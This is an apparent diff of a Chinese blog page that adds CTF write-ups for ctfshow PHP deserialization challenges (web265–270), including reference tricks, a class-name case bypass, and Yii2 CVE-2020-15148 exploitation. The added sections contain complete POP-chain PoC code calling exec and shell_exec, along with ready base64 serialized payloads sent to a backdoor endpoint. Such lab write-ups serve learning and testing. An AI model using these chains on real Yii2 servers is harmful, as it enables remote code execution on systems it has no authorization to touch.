@@ -874,14 +874,14 @@ __construc">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.9k
+                        4.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        19 分
+                        22 分
                     </div>
                     
                 
@@ -1612,21 +1612,27 @@ O<span class="token punctuation">:</span><span class="token number">7</span><spa
 <span class="token punctuation">}</span>
 
 <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span>
+<span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成随机数</span>
 
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>引用：</strong></p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;将a的地址传给b，所以b的值是跟着a的变化而变化</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">abc</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此时哪怕修改a的值也不管用</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span>
 
 <span class="token comment" spellcheck="true">//运行结果</span>
-<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+cc459dba9ce1830f72c80ba14532bbac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这波儿就叫引用传值</p>
 <p><strong>payload：</strong></p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">{</span>
@@ -1634,11 +1640,153 @@ O<span class="token punctuation">:</span><span class="token number">7</span><spa
     <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//让passwd的值随token变</span>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token comment" spellcheck="true">//运行结果</span>
 O<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"ctfshowAdmin"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="web266——PHP对类名的大小写不敏感"><a href="#web266——PHP对类名的大小写不敏感" class="headerlink" title="web266——PHP对类名的大小写不敏感"></a>web266——PHP对类名的大小写不敏感</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Error $ctfshowo"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当我们序列化的字符串里面如果有ctfshow就会抛出一个异常，这样就没法触发<code>__destrurt魔术方法了</code>,所以得绕过这个正则。</p>
+<pre class="line-numbers language-php"><code class="language-php">区分大小写的： 变量名、常量名、数组索引（键名key）
+
+不区分大小写的：函数名、方法名、类名、魔术常量、<span class="token keyword">NULL</span>、<span class="token constant">FALSE</span>、<span class="token constant">TRUE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>payload:</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Ctfshow</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
+<span class="token comment" spellcheck="true">//O:7:"Ctfshow":0:{}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210824234732153.png" alt="image-20210824234732153"></p>
+<h1 id="web267——Yii反序列化漏洞"><a href="#web267——Yii反序列化漏洞" class="headerlink" title="web267——Yii反序列化漏洞"></a>web267——Yii反序列化漏洞</h1><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943" target="_blank" rel="noopener">Yii2 反序列化漏洞(CVE-2020-15148)复现</a></p>
+<p><strong>影响范围：</strong></p>
+<p>Yii2 &lt;2.0.38</p>
+<p>admin/admin弱口令进入管理员账户，在about页面查看源代码会发现 <code>&lt;!--?view-source --&gt;</code></p>
+<p>访问<code>?r=site%2Fabout&amp;view-source</code>得到：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">///backdoor/shell</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>现成poc：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">IndexAction</span><span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string">'exec'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//PHP函数</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string">'cat /flag >2.txt'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//PHP函数的参数  </span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">Generator</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>
+
+    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dataReader</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span><span class="token punctuation">{</span>
+
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>payload：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>根目录访问2.txt得到flag</p>
+<h1 id="web268-270——Yii反序列化漏洞"><a href="#web268-270——Yii反序列化漏洞" class="headerlink" title="web268-270——Yii反序列化漏洞"></a>web268-270——Yii反序列化漏洞</h1><p>做法一样但是需要修改poc，因为存在过滤</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Action</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">class</span> <span class="token class-name">IndexAction</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">{</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MultiFieldSession</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">class</span> <span class="token class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
+    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此处写命令</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>payload：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
             </div>
             <hr/>
@@ -2361,7 +2509,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">122.2k</span> 字
+                <span class="white-color">122.7k</span> 字
             
 
             
